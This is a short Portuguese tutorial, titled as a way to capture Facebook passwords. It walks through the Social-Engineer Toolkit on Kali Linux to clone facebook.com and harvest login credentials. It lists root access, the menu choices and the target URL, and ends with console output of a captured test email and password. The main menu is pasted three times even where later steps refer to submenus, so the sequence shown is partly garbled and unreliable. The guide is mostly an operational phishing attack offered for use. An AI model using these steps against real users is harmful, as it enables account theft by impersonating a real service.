Phishing para captura de senhas do Facebook

Configurando o Phishing no Kali Linux

Acessar o terminal como root
sudo su

Iniciar o setoolkit
setoolkit

Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

Selecionar a opção 1

Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

Selecionar a opção 2

Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About

  99) Exit the Social-Engineer Toolkit

Selecionar a opção 3

   1) Web Templates
   2) Site Cloner
   3) Custom Import

  99) Return to Webattack Menu

Selectionar a opção 2


set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.10.223]: 
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone: http://www.facebook.com

Conferir o IP da sua máquina virtual e depois digitar o site que será clonado http://www.facebook.com

Abrir o navegador e digitar o IP da sua máquina virtual, irá abrir o site clonado do facebook, nesse site você digita um login e senha e verifica no console se o usuário e senha foi capturado

POSSIBLE USERNAME FIELD FOUND: email=testedio@gmail.com                                                                                          
POSSIBLE PASSWORD FIELD FOUND: senha123456
PARAM: prefill_contact_point=                                                                                                                    
PARAM: prefill_source=                                                                                                                           
PARAM: prefill_type=                                                                                                                             
PARAM: first_prefill_source=                                                                                                                     
PARAM: first_prefill_type=                                                                                                                       
PARAM: had_cp_prefilled=false 
